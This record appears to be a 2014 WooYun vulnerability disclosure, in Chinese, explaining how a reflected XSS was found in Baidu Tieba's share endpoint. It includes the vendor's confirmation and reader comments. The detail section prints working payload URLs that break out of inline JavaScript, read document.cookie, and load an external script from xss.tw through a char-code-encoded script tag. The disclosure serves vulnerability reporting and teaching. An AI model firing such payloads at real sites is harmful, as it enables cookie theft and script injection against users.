{"id": 5395, "wybug_id": "wooyun-2014-050220", "wybug_title": "我是如何挖掘出百度贴吧主站反射型XSS的", "wybug_corp": "百度", "wybug_author": "超威蓝猫", "wybug_date": "2014-02-03 11:02", "wybug_open_date": "2014-03-20 11:03", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向公众公开  简要描述： 我是如何挖掘出百度贴吧主站反射型XSS的 详细说明：  首先，我们在 share.baidu.com 上找到目标，这是\"转帖到百度贴吧\"的链接地址:\nhttp://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fshare.baidu.com%2F%230-tieba-1-78014-7eff13ea8df1a334a227e1223f8d0dd3&title=%B0%D9%B6%C8%B7%D6%CF%ED%A3%AC%CE%AA%C4%FA%B4%F8%C0%B4%B8%FC%B6%E0%C1%F7%C1%BF%20-%20%B0%D9%B6%C8%B7%D6%CF%ED&desc=&comment=\n\n\n可以看到，该URL中传入的参数\"url\"会输出在js代码段中，同时前面还有个\"pic\"参数，内容是来源于所传入url页面内的图片的地址，并非从URL中直接传入。我们猜测此处可以主动传入\"pic\"参数的内容。我们来测试一下。为了直观，这里省去无关的 title 、 desc 、 comment 参数。\nhttp://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com&pic=http://www.google.com/images/srpr/logo11w.png\n\n\n果然原模原样输出了。经过测试，我们知道传入的\"pic\"参数必须以图片格式结尾，例如.png或.jpg等，且\"pic\"参数没有过滤双引号\"(%22)。\nhttp://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com&pic=hellobaidu%22.png\n\n\n\n\n虽然这里没过滤双引号，但只要传入 < 或 > ，pic参数就不会输出在js段中，所以我们无法闭合<script>标签来插入新的HTML标签。我们不妨试着在当前<script>标签中写入自己的语句。将该段js文本格式化，通过观察可以很容易写出闭合语句:\nhttp://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com&pic=hellobaidu%22]}//.png\n\n\n虽然闭合是闭合成功了，但想写入自己的语句必须在 } 后面加个 ; 才有效，测试可发现若传入 ; 则输出在js段中的pic参数的内容是分号后面的文本。\nhttp://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com&pic=hellobaidu%22]};xsscode//.png\n\n\n忧伤的我听着《午夜DJ》，瞬间变得机智：URL中传入的\"url\"参数输出在\"pic\"参数后面。如果巧妙地运用换行符(%0a)和注释(//)可能可以构造出XSS。经过测试可知，pic参数和url参数均可传入 %0a 换行符。我们构造以下代码:\nhttp://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com%0aalert(/hi%20baidu/)//&pic=hellobaidu%22]}//.png\n\n\n在\"pic\"参数中，用 \"]} 闭合了前面的语句后，用 // 注释掉后面的代码，由于\"url\"参数输出的位置在\"pic\"的后面，我们传入的\"url\"参数用换行符 %0a 来截断注释，写新的一行，然后写入自己的代码，之后用 // 注释后面的无关代码以保证不出现错误。\n\n\n\n最后构造出的URI:\nhttp://tieba.baidu.com/f/commit/share/openShareApi?url=http://%0aalert(document.cookie)//&pic=%22]}//.gif\n\n\n调用外部js(此处过滤了单双引号。其实URL可以更短的,这里只作证明可调用外部js):\nhttp://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com%0adocument.write(String.fromCharCode(39,60,115,99,114,105,112,116,32,115,114,99,61,47,47,120,115,115,46,116,119,62,39))//&pic=%22]}//.gif\n   漏洞证明：  如上。虽然BDUSS是http-only保护的，但XSS总是存在一定风险的。   修复方案：  过滤和转义   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2014-02-03 11:26 厂商回复： 感谢提交，安全团队会尽快联系业务部门处理，新年快乐。--“百度，因你更安全” 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-03 11:26 |    \t\tRicter \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:15        | 渣渣一个)\t\t \n  mark    \n     2014-02-03 16:00 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  怎么挖的    \n     2014-02-03 16:17 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  用工具挖，    \n     2014-02-03 18:28 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  刚才你问我啊，我可以回答你说无可奉告，但是你们又不高兴，我怎么办？    \n     2014-02-04 02:16 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  ...这下没人卖这个了，天天有人卖    \n     2014-02-04 14:50 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  “看我如何”和“我是如何”系列    \n     2014-03-21 09:50 |    \t\tsampro \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:1        | Hello World)\t\t \n  教程级提交，very good！    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}